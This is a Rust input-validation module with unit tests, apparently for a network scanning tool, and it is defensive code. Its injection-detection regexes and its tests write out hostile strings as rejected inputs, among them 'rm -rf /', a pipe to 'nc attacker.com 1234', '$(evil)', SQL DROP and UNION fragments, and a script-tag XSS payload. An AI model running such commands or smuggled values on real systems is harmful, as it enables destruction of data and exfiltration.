use anyhow::{anyhow, Result};
use regex::Regex;
use std::collections::HashSet;
use std::net::IpAddr;

const MAX_TARGET_LENGTH: usize = 253;
const MAX_HOSTNAME_LABEL_LENGTH: usize = 63;
const MAX_PORTS_PER_REQUEST: usize = 65535;
const MAX_TARGETS_PER_REQUEST: usize = 10000;
const MAX_PORT_RANGE_SIZE: u16 = 1024;
const MAX_SCAN_RATE: u32 = 100000;

lazy_static::lazy_static! {
    static ref VALID_HOSTNAME: Regex = Regex::new(
        r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
    ).unwrap();
    static ref INJECTION_PATTERNS: Vec<Regex> = vec![
        Regex::new(r"(?i)(\b(union|select|insert|update|delete|drop|alter|exec|execute)\b)").unwrap(),
        Regex::new(r"(?i)(--|;|/\*|\*/|xp_|0x)").unwrap(),
        Regex::new(r"(?i)(\|\||&&|;|\$\(|`.*`)").unwrap(),
        Regex::new(r"(?i)(<script|javascript:|on\w+\s*=)").unwrap(),
    ];
}

#[derive(Debug, Clone)]
pub struct InputValidator {
    blocked_targets: HashSet<String>,
    allowed_cidr_prefixes: Vec<u8>,
    max_targets: usize,
    max_ports: usize,
    max_port_range: u16,
    max_scan_rate: u32,
    allow_private_ranges: bool,
    allow_loopback: bool,
    allow_multicast: bool,
}

impl Default for InputValidator {
    fn default() -> Self {
        Self {
            blocked_targets: HashSet::new(),
            allowed_cidr_prefixes: vec![8, 16, 20, 24, 28, 32],
            max_targets: MAX_TARGETS_PER_REQUEST,
            max_ports: MAX_PORTS_PER_REQUEST,
            max_port_range: MAX_PORT_RANGE_SIZE,
            max_scan_rate: MAX_SCAN_RATE,
            allow_private_ranges: true,
            allow_loopback: false,
            allow_multicast: false,
        }
    }
}

impl InputValidator {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn strict() -> Self {
        Self {
            allow_private_ranges: false,
            allow_loopback: false,
            allow_multicast: false,
            max_targets: 1000,
            max_ports: 1000,
            ..Self::default()
        }
    }

    pub fn with_blocked_targets(mut self, targets: Vec<String>) -> Self {
        self.blocked_targets = targets.into_iter().collect();
        self
    }

    pub fn with_max_targets(mut self, max: usize) -> Self {
        self.max_targets = max;
        self
    }

    pub fn with_max_ports(mut self, max: usize) -> Self {
        self.max_ports = max;
        self
    }

    pub fn with_max_port_range(mut self, max: u16) -> Self {
        self.max_port_range = max;
        self
    }

    pub fn with_allow_private(mut self, allow: bool) -> Self {
        self.allow_private_ranges = allow;
        self
    }

    pub fn with_allow_loopback(mut self, allow: bool) -> Self {
        self.allow_loopback = allow;
        self
    }

    pub fn validate_target(&self, target: &str) -> Result<String> {
        let trimmed = target.trim();

        if trimmed.is_empty() {
            return Err(anyhow!("Target cannot be empty"));
        }

        if trimmed.len() > MAX_TARGET_LENGTH {
            return Err(anyhow!(
                "Target exceeds maximum length of {} characters",
                MAX_TARGET_LENGTH
            ));
        }

        if self.contains_injection_pattern(trimmed) {
            return Err(anyhow!("Target contains potentially malicious pattern"));
        }

        if self.blocked_targets.contains(trimmed) {
            return Err(anyhow!("Target is blocked"));
        }

        if trimmed.contains('/') {
            self.validate_cidr(trimmed)?;
        } else if let Ok(ip) = trimmed.parse::<IpAddr>() {
            self.validate_ip(&ip)?;
        } else if is_octet_range(trimmed) {
            self.validate_octet_range(trimmed)?;
        } else if looks_like_ipv4(trimmed) {
            return Err(anyhow!("Invalid IP address: {}", trimmed));
        } else {
            self.validate_hostname(trimmed)?;
        }

        Ok(trimmed.to_string())
    }

    pub fn validate_targets(&self, targets: &[String]) -> Result<Vec<String>> {
        if targets.is_empty() {
            return Err(anyhow!("At least one target is required"));
        }

        if targets.len() > self.max_targets {
            return Err(anyhow!(
                "Too many targets: {}. Maximum is {}",
                targets.len(),
                self.max_targets
            ));
        }

        let mut validated = Vec::with_capacity(targets.len());
        for target in targets {
            validated.push(self.validate_target(target)?);
        }

        Ok(validated)
    }

    pub fn validate_port(&self, port: u16) -> Result<u16> {
        if port == 0 {
            return Err(anyhow!("Port 0 is invalid"));
        }
        Ok(port)
    }

    pub fn validate_ports(&self, ports: &[u16]) -> Result<Vec<u16>> {
        if ports.is_empty() {
            return Err(anyhow!("At least one port is required"));
        }

        if ports.len() > self.max_ports {
            return Err(anyhow!(
                "Too many ports: {}. Maximum is {}",
                ports.len(),
                self.max_ports
            ));
        }

        for port in ports {
            self.validate_port(*port)?;
        }

        let unique: HashSet<u16> = ports.iter().copied().collect();
        Ok(unique.into_iter().collect())
    }

    pub fn validate_port_range(&self, start: u16, end: u16) -> Result<(u16, u16)> {
        self.validate_port(start)?;
        self.validate_port(end)?;

        if start > end {
            return Err(anyhow!("Start port {} must be <= end port {}", start, end));
        }

        let range_size = (end as u32) - (start as u32) + 1;
        if range_size > self.max_port_range as u32 {
            return Err(anyhow!(
                "Port range too large: {} ports. Maximum is {}",
                range_size,
                self.max_port_range
            ));
        }

        Ok((start, end))
    }

    pub fn validate_scan_rate(&self, rate: u32) -> Result<u32> {
        if rate == 0 {
            return Err(anyhow!("Scan rate must be > 0"));
        }
        if rate > self.max_scan_rate {
            return Err(anyhow!(
                "Scan rate {} exceeds maximum {}",
                rate,
                self.max_scan_rate
            ));
        }
        Ok(rate)
    }

    pub fn validate_timing_value(&self, value: &str) -> Result<String> {
        let valid_timings = [
            "paranoid",
            "sneaky",
            "polite",
            "normal",
            "aggressive",
            "insane",
        ];
        let lower = value.to_lowercase();
        if valid_timings.contains(&lower.as_str()) {
            Ok(lower)
        } else {
            Err(anyhow!(
                "Invalid timing template '{}'. Valid: {:?}",
                value,
                valid_timings
            ))
        }
    }

    pub fn validate_scan_type(&self, scan_type: &str) -> Result<String> {
        let valid_types = [
            "tcp", "udp", "syn", "connect", "ack", "window", "null", "fin", "xmas",
        ];
        let lower = scan_type.to_lowercase();
        if valid_types.contains(&lower.as_str()) {
            Ok(lower)
        } else {
            Err(anyhow!(
                "Invalid scan type '{}'. Valid: {:?}",
                scan_type,
                valid_types
            ))
        }
    }

    pub fn sanitize_string(input: &str) -> String {
        input
            .chars()
            .filter(|c| c.is_alphanumeric() || "._-@:/ ".contains(*c))
            .collect()
    }

    fn contains_injection_pattern(&self, input: &str) -> bool {
        INJECTION_PATTERNS.iter().any(|p| p.is_match(input))
    }

    fn validate_ip(&self, ip: &IpAddr) -> Result<()> {
        if !self.allow_loopback && ip.is_loopback() {
            return Err(anyhow!("Loopback addresses are not allowed"));
        }

        if !self.allow_multicast && is_multicast(ip) {
            return Err(anyhow!("Multicast addresses are not allowed"));
        }

        if !self.allow_private_ranges && is_private(ip) {
            return Err(anyhow!("Private addresses are not allowed by policy"));
        }

        Ok(())
    }

    fn validate_cidr(&self, cidr: &str) -> Result<()> {
        use ipnetwork::IpNetwork;

        let network: IpNetwork = cidr
            .parse()
            .map_err(|_| anyhow!("Invalid CIDR notation: {}", cidr))?;

        let prefix = network.prefix();
        if !self.allowed_cidr_prefixes.contains(&prefix) {
            return Err(anyhow!(
                "CIDR prefix /{} not allowed. Allowed: {:?}",
                prefix,
                self.allowed_cidr_prefixes
            ));
        }

        let ip_count: u64 = 1u64 << (32 - prefix as u64);
        if ip_count > self.max_targets as u64 {
            return Err(anyhow!(
                "CIDR range contains {} addresses, exceeding max of {}",
                ip_count,
                self.max_targets
            ));
        }

        self.validate_ip(&network.network())?;

        Ok(())
    }

    fn validate_octet_range(&self, range: &str) -> Result<()> {
        let parts: Vec<&str> = range.split('.').collect();
        if parts.len() != 4 {
            return Err(anyhow!("Invalid range format: {}", range));
        }

        for part in &parts {
            if part.contains('-') {
                let range_parts: Vec<&str> = part.split('-').collect();
                if range_parts.len() != 2 {
                    return Err(anyhow!("Invalid range segment: {}", part));
                }
                let start: u16 = range_parts[0]
                    .parse()
                    .map_err(|_| anyhow!("Invalid range start: {}", range_parts[0]))?;
                let end: u16 = range_parts[1]
                    .parse()
                    .map_err(|_| anyhow!("Invalid range end: {}", range_parts[1]))?;
                if start > end {
                    return Err(anyhow!("Range start {} > end {}", start, end));
                }
                if end > 255 {
                    return Err(anyhow!("Range value {} exceeds 255", end));
                }
            } else {
                let val: u16 = part
                    .parse()
                    .map_err(|_| anyhow!("Invalid octet: {}", part))?;
                if val > 255 {
                    return Err(anyhow!("Octet value {} exceeds 255", val));
                }
            }
        }

        Ok(())
    }

    fn validate_hostname(&self, hostname: &str) -> Result<()> {
        if hostname.len() > MAX_TARGET_LENGTH {
            return Err(anyhow!(
                "Hostname exceeds maximum length of {}",
                MAX_TARGET_LENGTH
            ));
        }

        for label in hostname.split('.') {
            if label.is_empty() {
                return Err(anyhow!("Hostname contains empty label"));
            }
            if label.len() > MAX_HOSTNAME_LABEL_LENGTH {
                return Err(anyhow!(
                    "Hostname label '{}' exceeds maximum length of {}",
                    label,
                    MAX_HOSTNAME_LABEL_LENGTH
                ));
            }
        }

        if !VALID_HOSTNAME.is_match(hostname) {
            return Err(anyhow!("Invalid hostname format: {}", hostname));
        }

        Ok(())
    }
}

fn is_private(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            let octets = v4.octets();
            octets[0] == 10
                || (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31)
                || (octets[0] == 192 && octets[1] == 168)
                || octets[0] == 169 && octets[1] == 254
        }
        IpAddr::V6(_) => false,
    }
}

fn is_multicast(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => v4.octets()[0] >= 224 && v4.octets()[0] <= 239,
        IpAddr::V6(v6) => v6.segments()[0] & 0xff00 == 0xff00,
    }
}

fn is_octet_range(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    let mut has_range = false;
    for part in &parts {
        if part.contains('-') {
            has_range = true;
            let range_parts: Vec<&str> = part.split('-').collect();
            if range_parts.len() != 2 {
                return false;
            }
            if range_parts[0].parse::<u16>().is_err() || range_parts[1].parse::<u16>().is_err() {
                return false;
            }
        } else if part.parse::<u16>().is_err() {
            return false;
        }
    }
    has_range
}

fn looks_like_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    parts.iter().all(|p| p.parse::<u16>().is_ok())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_valid_ip() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("192.168.1.1").is_ok());
        assert!(validator.validate_target("10.0.0.1").is_ok());
        assert!(validator.validate_target("8.8.8.8").is_ok());
    }

    #[test]
    fn test_validate_empty_target() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("").is_err());
        assert!(validator.validate_target("  ").is_err());
    }

    #[test]
    fn test_validate_hostname() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("example.com").is_ok());
        assert!(validator.validate_target("sub.example.com").is_ok());
        assert!(validator.validate_target("my-host.example.com").is_ok());
    }

    #[test]
    fn test_validate_invalid_hostname() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("-invalid.com").is_err());
        assert!(validator.validate_target("invalid-.com").is_err());
        assert!(validator.validate_target(".invalid.com").is_err());
    }

    #[test]
    fn test_validate_cidr() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("192.168.1.0/24").is_ok());
        assert!(validator.validate_target("10.0.0.0/28").is_ok());
    }

    #[test]
    fn test_validate_cidr_invalid_prefix() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("192.168.1.0/33").is_err());
    }

    #[test]
    fn test_validate_cidr_too_large() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("10.0.0.0/8").is_err());
    }

    #[test]
    fn test_validate_octet_range() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("192.168.1.1-10").is_ok());
        assert!(validator.validate_target("192.168.1-2.1-2").is_ok());
    }

    #[test]
    fn test_validate_invalid_octet_range() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("192.168.1.10-5").is_err());
        assert!(validator.validate_target("192.168.1.256").is_err());
    }

    #[test]
    fn test_injection_prevention() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("192.168.1.1; rm -rf /").is_err());
        assert!(validator
            .validate_target("192.168.1.1 | nc attacker.com 1234")
            .is_err());
        assert!(validator.validate_target("192.168.1.1 $(evil)").is_err());
    }

    #[test]
    fn test_sql_injection_prevention() {
        let validator = InputValidator::new();
        assert!(validator
            .validate_target("192.168.1.1 UNION SELECT")
            .is_err());
        assert!(validator
            .validate_target("192.168.1.1; DROP TABLE")
            .is_err());
        assert!(validator.validate_target("192.168.1.1--").is_err());
    }

    #[test]
    fn test_xss_prevention() {
        let validator = InputValidator::new();
        assert!(validator
            .validate_target("<script>alert(1)</script>")
            .is_err());
        assert!(validator.validate_target("javascript:alert(1)").is_err());
    }

    #[test]
    fn test_blocked_targets() {
        let validator = InputValidator::new()
            .with_blocked_targets(vec!["evil.com".to_string(), "192.168.1.100".to_string()]);

        assert!(validator.validate_target("evil.com").is_err());
        assert!(validator.validate_target("192.168.1.100").is_err());
        assert!(validator.validate_target("192.168.1.1").is_ok());
    }

    #[test]
    fn test_strict_mode_blocks_private() {
        let validator = InputValidator::strict();
        assert!(validator.validate_target("192.168.1.1").is_err());
        assert!(validator.validate_target("10.0.0.1").is_err());
        assert!(validator.validate_target("8.8.8.8").is_ok());
    }

    #[test]
    fn test_validate_ports() {
        let validator = InputValidator::new();
        assert!(validator.validate_ports(&[80, 443, 8080]).is_ok());
        assert!(validator.validate_ports(&[0]).is_err());
        assert!(validator.validate_ports(&[]).is_err());
    }

    #[test]
    fn test_validate_port_range() {
        let validator = InputValidator::new();
        assert!(validator.validate_port_range(80, 443).is_ok());
        assert!(validator.validate_port_range(1, 1024).is_ok());
        assert!(validator.validate_port_range(443, 80).is_err());
        assert!(validator.validate_port_range(1, 2000).is_err());
    }

    #[test]
    fn test_validate_scan_rate() {
        let validator = InputValidator::new();
        assert!(validator.validate_scan_rate(1000).is_ok());
        assert!(validator.validate_scan_rate(0).is_err());
        assert!(validator.validate_scan_rate(200000).is_err());
    }

    #[test]
    fn test_validate_timing() {
        let validator = InputValidator::new();
        assert!(validator.validate_timing_value("normal").is_ok());
        assert!(validator.validate_timing_value("NORMAL").is_ok());
        assert!(validator.validate_timing_value("invalid").is_err());
    }

    #[test]
    fn test_validate_scan_type() {
        let validator = InputValidator::new();
        assert!(validator.validate_scan_type("tcp").is_ok());
        assert!(validator.validate_scan_type("SYN").is_ok());
        assert!(validator.validate_scan_type("invalid").is_err());
    }

    #[test]
    fn test_max_targets() {
        let validator = InputValidator::new().with_max_targets(2);
        let targets = vec![
            "192.168.1.1".to_string(),
            "192.168.1.2".to_string(),
            "192.168.1.3".to_string(),
        ];
        assert!(validator.validate_targets(&targets).is_err());
    }

    #[test]
    fn test_sanitize_string() {
        let clean = InputValidator::sanitize_string("hello-world_test.com");
        assert_eq!(clean, "hello-world_test.com");

        let dirty = InputValidator::sanitize_string("test\x00\x01\x02");
        assert_eq!(dirty, "test");
    }

    #[test]
    fn test_hostname_too_long() {
        let validator = InputValidator::new();
        let long_hostname = "a".repeat(254) + ".com";
        assert!(validator.validate_target(&long_hostname).is_err());
    }

    #[test]
    fn test_loopback_blocked_by_default() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("127.0.0.1").is_err());
        assert!(validator.validate_target("127.0.0.1").is_err());
    }

    #[test]
    fn test_multicast_blocked_by_default() {
        let validator = InputValidator::new();
        assert!(validator.validate_target("224.0.0.1").is_err());
    }

    #[test]
    fn test_loopback_allowed_when_configured() {
        let validator = InputValidator::new().with_allow_loopback(true);
        assert!(validator.validate_target("127.0.0.1").is_ok());
    }
}
